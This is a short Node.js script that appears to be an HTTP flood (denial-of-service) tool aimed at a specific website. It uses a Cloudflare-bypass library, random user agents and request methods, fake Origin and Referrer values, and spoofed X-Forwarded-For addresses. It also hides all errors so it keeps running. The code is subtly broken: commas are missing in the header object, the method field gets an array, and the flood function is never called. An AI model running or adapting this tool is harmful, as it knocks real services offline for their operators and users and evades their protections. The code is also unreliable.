const cloudflare = require("cloudflare-bypasser")
const cf = new cloudflare();
const randomstring = require("randomstring")
const fakeUa = require("fake-useragent");
var char = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
var charr = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
ipq = function ranip(){
return Math.round(Math.random()*256)
}

function flood_req(){
var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
cf.request({
method:Array_method,
resolveWithFullResponse: true,
headers:{
'User-Agent': fakeUa()
'Upgrade-Insecure-Requests': '1',
'Connection':'Keep-Alive',
'Keep-Alive': 'timeout=10,max=100'
'Origin': 'http://' + char + '.com',
'Referrer': 'http://google.com/' + char,
'X-Forwarded-For': ip
},
url:"https://ufagoal168.co/"
})

}
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
